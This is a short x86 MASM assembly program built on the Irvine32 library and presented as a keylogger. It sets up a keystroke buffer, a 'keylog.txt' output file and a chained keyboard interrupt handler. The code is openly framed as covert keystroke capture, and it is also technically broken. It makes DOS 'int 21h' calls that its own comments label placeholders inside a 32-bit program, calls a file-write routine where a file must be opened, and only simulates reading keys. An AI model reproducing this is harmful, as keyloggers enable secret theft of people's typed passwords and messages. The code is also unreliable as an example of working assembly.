INCLUDE Irvine32.inc

.data
    FileName        db "keylog.txt", 0
    StartMsg        db "Keylogger initialized at: ", 0
    KeyBuffer       db 256 dup(?)
    KeyCount        DWORD 0

    LOG_INTERVAL    equ 600
    OldISR          dd 0

.code
main PROC
    ; Open or create the keylog file
    mov edx, OFFSET FileName
    call WriteToFile
    mov ebx, eax        ; Store file handle in EBX

    ; Write initial log message
    mov edx, OFFSET StartMsg
    call WriteString
    call WriteDec       ; Print timestamp or some numeric data (stub)
    call Crlf

    ; Begin keylogging
    call BeginLogging

    ; Wait for user input to stop (simulate run duration)
    call ReadChar

    ; Stop keylogging
    call EndLogging

    ; Write collected keystrokes to file
    mov edx, OFFSET KeyBuffer
    mov ecx, KeyCount
    call WriteToFile

    ; Close log file
    mov eax, ebx
    call CloseFile

    ; Exit process
    Invoke ExitProcess, 0
main ENDP

BeginLogging PROC
    ; Reset key buffer
    mov KeyCount, 0

    ; Install new keyboard ISR (simulated via int 21h stub)
    mov eax, OFFSET KeyboardISR
    mov ebx, OFFSET OldISR
    int 21h     ; Placeholder for interrupt vector manipulation

    ret
BeginLogging ENDP

EndLogging PROC
    ; Restore old keyboard ISR
    mov eax, OFFSET OldISR
    mov ebx, OFFSET KeyboardISR
    int 21h     ; Placeholder for ISR restoration

    ret
EndLogging ENDP

KeyboardISR PROC
    ; Check if buffer full
    cmp KeyCount, 255
    jae SkipWrite

    ; Write keystroke (simulate key read in AL)
    mov esi, OFFSET KeyBuffer
    add esi, KeyCount
    mov [esi], al
    inc KeyCount

SkipWrite:
    ; Jump to original ISR
    jmp dword ptr [OldISR]
KeyboardISR ENDP

END main
